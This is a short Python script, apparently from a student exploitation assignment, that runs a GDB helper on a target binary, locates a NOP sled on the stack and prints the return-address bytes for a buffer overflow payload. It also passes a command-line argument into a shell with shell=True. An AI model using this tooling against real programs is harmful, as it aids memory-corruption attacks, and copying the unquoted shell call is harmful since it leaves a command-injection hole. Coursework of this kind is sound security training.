# Taylor Smith - Major Exploitation Task

import re
import sys
import subprocess

def find_stack_address(output):
    # Regex pattern to match the desired output
    pattern = r'0x7fffffff([0-9a-fA-F]{4}):\s+0x9090909090909090\s+0x9090909090909090'
    
    # Search for the last occurrence of the pattern in the output
    matches = list(re.finditer(pattern, output))
    
    if matches:
        # If found, return the XXXX part of the last match
        return matches[-1].group(1)
    else:
        return None

# Example usage
if __name__ == "__main__":

    # Get the actual GDB output using gdb.py   
    program_name = sys.argv[1] if len(sys.argv) > 1 else "./pie"
    gdb_command = f"python3 gdb.py {program_name}"
    
    try:
        gdb_output = subprocess.check_output(gdb_command, shell=True, text=True)
    except subprocess.CalledProcessError as e:
        print(f"Error running gdb.py: {e}")
        gdb_output = ""
    
    # Use the actual GDB output
    sample_output = gdb_output
    
    result = find_stack_address(sample_output)
    if result:
        #print(f"0x7fffffff{result}")
        new_bytes = result
        #print(new_bytes)
        # Split new_bytes into two halves
        first_half = new_bytes[:2]
        second_half = new_bytes[2:]
        #print(first_half)
        #print(second_half)

        auto_return_address = f"\\x{second_half}\\x{first_half}\\xff\\xff\\xff\\x7f"
        print(auto_return_address)
    else:
        print("No matching address found")